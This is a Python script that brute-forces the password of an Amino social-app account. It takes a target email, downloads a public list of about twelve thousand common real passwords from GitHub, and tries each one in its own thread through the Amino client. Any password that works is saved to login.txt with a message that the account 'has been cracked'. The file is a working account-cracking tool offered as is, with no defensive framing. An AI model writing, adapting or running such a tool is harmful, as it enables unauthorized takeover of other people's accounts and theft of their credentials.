#import necessary models
import amino
from urllib.request import urlopen
from amino.lib.util import exceptions
from threading import Thread


#print("Github PassList : " + "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt")



email = input("type account email >")
file = open("login.txt",'w')




#request the password list
def guess(url):
    pass_file = urlopen(url).read()
    #rint(plst)
    return pass_file


#the login function
def login(jargs):
    try:
        c  = amino.Client()
        c.login(email,jargs)
        if c.profile.nickname is not None:
            file.write('email: ' + email + "\n" + "password: " + jargs)
            file.close()
            print("account of " + c.profile.nickname + "has been cracked ")
            print("and saved on txt file at " + "./login.txt")
        if c.profile.nickname is None:
            print("failed to login with " + jargs)
        
    except:
        print("f")
        #amino.exceptions.InvalidAccountOrPassword 
        #print("amino breaker could not crack the password")
                
wordlist = guess("https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt").decode('UTF-8')

guesspasswordlist = wordlist.split('\n')

#thread process to crack the pass
for pwd in guesspasswordlist:
    Thread(target=login,args=(pwd,)).start()
